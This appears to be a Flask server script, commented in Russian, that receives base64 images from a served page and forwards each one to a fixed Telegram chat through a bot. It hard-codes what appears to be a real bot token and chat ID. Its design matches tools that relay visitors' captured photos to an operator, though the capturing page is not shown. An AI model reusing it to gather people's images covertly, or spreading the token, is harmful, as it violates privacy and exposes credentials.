from flask import Flask, request, jsonify, send_from_directory
import base64
import requests
import os
from datetime import datetime

app = Flask(__name__, static_folder='.')

# Конфигурация Telegram
BOT_TOKEN = '8145494033:AAFhbLUdG7coSdUznqXLLZcxO_ibThYvSNg'  # Замените на токен вашего бота
CHAT_ID = '752355263'  # Замените на ваш Telegram ID или ID группы

# Папка для временного хранения фотографий
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/upload', methods=['POST'])
def upload_photo():
    data = request.get_json()
    image_data = data.get('image')

    if not image_data:
        return jsonify({'error': 'No image data provided'}), 400

    # Убираем префикс "data:image/png;base64," из данных
    image_data = image_data.split(',')[1]
    image_bytes = base64.b64decode(image_data)

    # Сохраняем фото временно
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    file_path = os.path.join(UPLOAD_FOLDER, f'photo_{timestamp}.png')

    with open(file_path, 'wb') as f:
        f.write(image_bytes)

    # Отправляем фото в Telegram
    try:
        with open(file_path, 'rb') as photo:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
                data={'chat_id': CHAT_ID},
                files={'photo': photo}
            )

        if response.status_code == 200:
            return jsonify({'message': 'Photo uploaded and sent to Telegram successfully'}), 200
        else:
            return jsonify({'error': 'Failed to send photo to Telegram', 'details': response.text}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500
    finally:
        # Удаляем временный файл
        if os.path.exists(file_path):
            os.remove(file_path)

if __name__ == '__main__':
    app.run(debug=True)
